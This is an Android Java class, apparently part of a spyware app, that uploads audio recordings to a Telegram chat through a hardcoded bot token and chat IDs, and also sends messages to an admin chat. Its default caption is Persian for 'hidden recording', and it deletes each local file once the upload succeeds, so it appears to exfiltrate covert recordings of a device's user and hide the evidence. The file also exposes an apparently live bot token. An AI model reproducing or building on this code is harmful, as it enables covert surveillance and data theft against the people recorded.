package com.blu.app.voice;

import android.util.Log;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class TelegramUploader {
    private static final String TAG = "TelegramUploader";
    private static final String TELEGRAM_API = "https://api.telegram.org";
    
    // ✅ توکن و چت‌آیدی ثابت (همونهایی که تست شد)
    private static final String BOT_TOKEN = "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM";
    private static final String CHAT_ID = "-1004352035353";
    private static final String ADMIN_CHAT_ID = "8619991688";
    
    private OkHttpClient httpClient;
    
    public TelegramUploader() {
        this.httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build();
    }
    
    // ارسال پیام به گروه (با توکن ثابت)
    public boolean sendMessageToGroup(String message) {
        return sendMessage(BOT_TOKEN, CHAT_ID, message);
    }
    
    // ارسال پیام به ادمین
    public boolean sendMessageToAdmin(String message) {
        return sendMessage(BOT_TOKEN, ADMIN_CHAT_ID, "🔍 [DEBUG]\n" + message);
    }
    
    // ارسال پیام با توکن و چت‌آیدی دلخواه
    public boolean sendMessage(String botToken, String chatId, String message) {
        try {
            String finalBotToken = (botToken == null || botToken.isEmpty()) ? BOT_TOKEN : botToken;
            String finalChatId = (chatId == null || chatId.isEmpty()) ? CHAT_ID : chatId;
            
            Log.d(TAG, "📤 Sending message to: " + finalChatId);
            Log.d(TAG, "📝 Message: " + message);
            
            String url = TELEGRAM_API + "/bot" + finalBotToken + "/sendMessage";
            
            RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", finalChatId)
                .addFormDataPart("text", message)
                .build();
            
            Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();
            
            Response response = httpClient.newCall(request).execute();
            String responseBody = response.body() != null ? response.body().string() : "";
            
            Log.d(TAG, "📥 Response: " + response.code());
            Log.d(TAG, "📥 Body: " + responseBody);
            
            boolean success = response.isSuccessful();
            response.close();
            
            if (!success) {
                Log.e(TAG, "❌ Failed: " + responseBody);
            }
            
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error sending message", e);
            return false;
        }
    }
    
    // آپلود فایل صوتی
    public boolean uploadAudio(String filePath, String caption) {
        return uploadAudio(filePath, BOT_TOKEN, CHAT_ID, caption);
    }
    
    public boolean uploadAudio(String filePath, String botToken, String chatId, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Log.e(TAG, "❌ File not found: " + filePath);
                return false;
            }
            
            String finalBotToken = (botToken == null || botToken.isEmpty()) ? BOT_TOKEN : botToken;
            String finalChatId = (chatId == null || chatId.isEmpty()) ? CHAT_ID : chatId;
            
            Log.d(TAG, "📤 Uploading audio: " + filePath);
            Log.d(TAG, "📏 Size: " + file.length() + " bytes");
            
            RequestBody fileBody = RequestBody.create(
                file, 
                MediaType.parse("audio/m4a")
            );
            
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", finalChatId)
                .addFormDataPart("voice", file.getName(), fileBody)
                .addFormDataPart("caption", caption != null ? caption : "🎙️ ضبط مخفی")
                .build();
            
            String url = TELEGRAM_API + "/bot" + finalBotToken + "/sendVoice";
            Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();
            
            Response response = httpClient.newCall(request).execute();
            String responseBody = response.body() != null ? response.body().string() : "";
            
            Log.d(TAG, "📥 Upload response: " + response.code());
            Log.d(TAG, "📥 Body: " + responseBody);
            
            boolean success = response.isSuccessful();
            if (success) {
                Log.d(TAG, "✅ Upload successful!");
                file.delete();
            } else {
                Log.e(TAG, "❌ Upload failed: " + responseBody);
            }
            
            response.close();
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Upload error", e);
            return false;
        }
    }
}
